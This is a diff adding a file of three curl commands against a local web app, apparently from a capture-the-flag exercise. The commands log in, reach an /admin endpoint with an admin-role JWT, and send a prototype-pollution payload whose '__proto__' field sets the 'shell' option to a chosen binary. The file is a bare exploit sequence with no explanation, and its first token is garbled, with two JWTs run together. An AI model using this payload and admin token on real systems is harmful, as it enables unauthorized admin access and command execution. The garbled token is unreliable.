@@ -1,0 +1,6 @@
+curl -X POST -H "Content-type: application/json" http://localhost:3000/auth/login -d '{"username":"zharsuke", "password":"password"}'
+
+curl -X GET -H "Content-type: application/json" -H "x-access-token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRicm9ja3MiLCJpc19hdXRoIjp0cnVlLCJyb2eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiemhhcnN1a2UiLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEzNzU2NjEsImV4cCI6MTcwMTM3OTI2MX0.-KVmu8jzuOvRBnVkL9AQOajorGOFbZDK3XA-K7Asnbg" http://localhost:3000/admin
+
+curl -X POST -H "Content-type: application/json" -H "x-access-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiemhhcnN1a2UiLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEzNzU2NjEsImV4cCI6MTcwMTM3OTI2MX0.-KVmu8jzuOvRBnVkL9AQOajorGOFbZDK3XA-K7Asnbg" http://localhost:3000/admin/messages/send -d '{"text":"pwning","__proto__":{"shell":"/home/victor/fakeshell"}}'
